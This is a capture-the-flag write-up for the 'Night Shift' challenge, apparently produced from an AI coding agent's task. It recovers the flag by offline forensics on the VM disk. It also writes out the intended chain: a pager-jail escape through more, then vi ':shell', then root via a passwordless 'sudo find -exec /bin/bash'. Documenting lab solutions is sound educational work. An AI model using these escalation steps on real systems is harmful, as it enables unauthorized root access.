# Night Shift
> Reconstructed from Codex task [019f9d81-75da-7f93-a454-14abd9c8c7a1](thread://019f9d81-75da-7f93-a454-14abd9c8c7a1). Confirmed flags require intended-workflow evidence; rejected candidates remain explicitly marked.

## Challenge statement and supplied material

- **Exact name:** `Night Shift`
- **Points shown:** `300`
- **Prompt supplied:** no prose description was included in the chat; the user supplied the title, point value, and artifact link.
- **Original artifact link:** [Night Shift Google Drive file](https://drive.google.com/file/d/1SQ0wD-1K5O8HFV2xufLTd8GeXUDZo9WO/view?usp=sharing)
- The downloaded artifact was an OVA containing a Debian virtual machine.

## Category and status

- **Category:** Linux VM, pager escape, and local privilege escalation; solved through offline disk forensics.
- **Status:** **Confirmed solved**
- **Confirmed flag:** `pbctf{v_f0r_v1ct0ry_th3n_sud0}`

## High-level solution

The virtual disk reveals a two-account handoff. `player1` is only the entry account. A note gives the `player2` password, while `player2` has `/usr/local/bin/showtext` as its login shell. That script runs `more -e` on a short banner. Shrinking the terminal makes the banner overflow, exposing `more`'s `v` command, which launches `vi`. A `vi` shell escape yields a shell as `player2`. The sudoers configuration permits passwordless execution of `/usr/bin/find` as root, and `find -exec` yields a root shell. The flag is then read from `/home/root/flag`.

## Detailed procedure

### 1. Download the large Drive artifact

Opening the public Drive URL directly was blocked, and a raw `curl` download produced only a 2,432-byte Google virus-scan confirmation page. The installed standalone downloader worked:

```powershell
gdown.exe 1SQ0wD-1K5O8HFV2xufLTd8GeXUDZo9WO -O night-shift.ova
```

The recovered OVA had SHA-256:

```text
5CE39E9AC5396095923793C90AF593DACF2A2D520EDBCDD2E58E2A10E10E79A7
```

### 2. Extract and inspect the appliance

The OVA contained:

```text
night-shift.ovf
pbctf-night-shift-disk001.vmdk
```

The VMDK is a 220,553,216-byte stream-optimized image representing a 1.5 GiB virtual disk. 7-Zip recognized the embedded MBR and Linux ext filesystem, so mounting or booting was unnecessary:

```powershell
7z.exe l .\night-shift-work\pbctf-night-shift-disk001.vmdk
7z.exe x .\night-shift-work\pbctf-night-shift-disk001.vmdk `
  -o.\night-shift-fs home etc usr\local -r -y
```

Targeted extraction was preferable to a full filesystem extraction because Windows could not create several Linux symlinks, including the `vi` link.

### 3. Recover the account handoff

`/home/player1/handoff.txt` states:

```text
su player2
player2 password: h4ndoff_t0_pl2
```

`/etc/passwd` shows that `player2`'s login shell is not a normal shell:

```text
player2:x:1001:1001::/home/player2:/usr/local/bin/showtext
```

### 4. Understand and escape the pager jail

`/usr/local/bin/showtext` ends with:

```sh
exec more -e /etc/motd-banner.txt
```

The important detail is `-e`. If the banner fits in the terminal, `more` exits at EOF and offers no interactive prompt. Shrink the terminal until the banner requires paging. At the real `--More--` prompt:

1. Press `v` to enter `vi`.
2. In `vi`, set a usable shell:

   ```vim
   :set shell=/bin/bash
   ```

3. Escape to it:

   ```vim
   :shell
   ```

This yields a shell as `player2`.

### 5. Escalate through the allowed `find`

`/etc/sudoers.d/player2` contains:

```text
player2 ALL=(root) NOPASSWD: /usr/bin/find
```

Use `find`'s `-exec` action to start a root shell:

```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

Then read:

```bash
cat /home/root/flag
```

Output:

```text
pbctf{v_f0r_v1ct0ry_th3n_sud0}
```

## Validation evidence

- The flag was read directly from the extracted VM at `/home/root/flag`.
- A recursive search confirmed it was the only `pbctf{...}` token in the extracted filesystem.
- The handoff note, pager wrapper, account shell, and sudoers rule independently reconstruct the intended exploit chain.

## Skills used

- `solve-challenge`
- `ctf-forensics`

## Tools, utilities, and services used

- Google Drive
- Standalone `gdown.exe`
- 7-Zip 26.00
- PowerShell
- `rg`
- `Get-FileHash`
- WSL and `qemu-img` were attempted as a fallback, but the WSL package setup stalled and was unnecessary after 7-Zip successfully parsed the VMDK.

## Wrong turns and operational lessons

- The 2,432-byte file at `night-shift-download` is a Google confirmation page, not the OVA.
- Full VMDK extraction creates avoidable symlink errors on Windows.
- Booting the VM is not required to recover or validate the flag.

## Surviving local artifacts

- [OVA descriptor](C:/Users/kingg/Desktop/codex/night-shift-work/night-shift.ovf)
- [VMDK](C:/Users/kingg/Desktop/codex/night-shift-work/pbctf-night-shift-disk001.vmdk)
- [handoff.txt](C:/Users/kingg/Desktop/codex/night-shift-fs/home/player1/handoff.txt)
- [showtext](C:/Users/kingg/Desktop/codex/night-shift-fs/usr/local/bin/showtext)
- [player2 sudoers rule](C:/Users/kingg/Desktop/codex/night-shift-fs/etc/sudoers.d/player2)
- [confirmed flag file](C:/Users/kingg/Desktop/codex/night-shift-fs/home/root/flag)

## Diagram recommendation

**Yes.** A small linear exploit diagram materially helps:

```text
player1
  --[handoff password]--> player2/showtext
  --[shrink terminal]--> interactive more prompt
  --[v]--> vi
  --[:set shell + :shell]--> player2 bash
  --[sudo find -exec]--> root bash
  --[read /home/root/flag]--> confirmed flag
```

---

## Excalidraw diagram

Editable diagram: [Night Shift flow](diagrams/night-shift-escalation.excalidraw)

## Final High-Level Overview

A handoff moved from player1 to player2, a small terminal exposed the more pager, v entered vi, and a shell escape reached player2. Passwordless sudo find then yielded root and the unique flag in /home/root/flag.
